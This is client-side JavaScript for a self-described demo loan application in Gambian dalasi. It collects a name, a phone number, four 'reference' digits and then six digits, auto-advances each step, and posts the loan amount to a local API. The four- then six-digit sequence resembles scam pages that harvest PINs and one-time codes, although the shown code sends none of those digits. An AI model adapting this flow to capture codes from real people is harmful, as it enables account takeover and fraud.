const $ = id => document.getElementById(id);
let user = { name: '', phone: '' }, auto1 = null, auto2 = null, auto3 = null;
function show(n) { [1,2,3,4].forEach(i => $('page'+i).classList.toggle('hidden', i !== n)); [1,2,3].forEach(i => $('tab'+i).classList.toggle('active', i === n)); window.scrollTo({top:0, behavior:'smooth'}); }

// Page 1: local-only demo progression after the details and four sample digits are entered.
function autoSubmitDetails() {
  clearTimeout(auto1);
  const name = $('name').value.trim();
  const phone = $('phone').value.trim();
  const ref = $('reference4').value.replace(/\D/g, '').slice(0, 4);
  $('reference4').value = ref;
  if (name.length >= 2 && phone.length >= 6 && /^\d{4}$/.test(ref)) {
    $('status1').textContent = 'Demo details complete. Continuing…';
    auto1 = setTimeout(() => {
      user.name = name;
      user.phone = phone;
      show(2);
      $('reference6').focus();
    }, 350);
  }
}
['name', 'phone', 'reference4'].forEach(id => $(id).addEventListener('input', autoSubmitDetails));

// Page 2: continue locally as soon as six sample digits have been entered.
$('reference6').addEventListener('input', () => {
  clearTimeout(auto2);
  const ref = $('reference6').value.replace(/\D/g, '').slice(0, 6);
  $('reference6').value = ref;
  if (/^\d{6}$/.test(ref)) {
    $('status2').textContent = 'Six demo digits entered. Continuing…';
    auto2 = setTimeout(() => show(3), 350);
  }
});

$('amount').addEventListener('input', () => {
  clearTimeout(auto3);
  const amount = Number($('amount').value);
  if ($('amount').value && Number.isFinite(amount) && amount >= 5000 && amount <= 1000000 && !$('submit3').disabled) {
    $('status3').textContent = 'Amount valid. Continuing demo…';
    auto3 = setTimeout(() => $('submit3').click(), 700);
  }
});
$('submit3').onclick = async () => {
  const amount = Number($('amount').value); if (!Number.isFinite(amount) || amount < 5000 || amount > 1000000) { $('status3').textContent = 'Enter an amount between D5,000 and D1,000,000 GMD.'; return; }
  $('submit3').disabled = true;
  try {
    const r = await fetch('/api/loan-request', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({id:user.id, amount})});
    const d = await r.json(); if (!r.ok) throw new Error(d.error || 'Unable to continue'); $('status3').textContent = d.message; $('dashName').textContent = user.name || 'Demo Applicant'; $('dashPhone').textContent = user.phone || '—'; $('dashAmount').textContent = 'D' + amount.toLocaleString('en-US') + ' GMD'; show(4);
  } catch(e) { $('status3').textContent = e.message; }
  finally { $('submit3').disabled = false; }
};
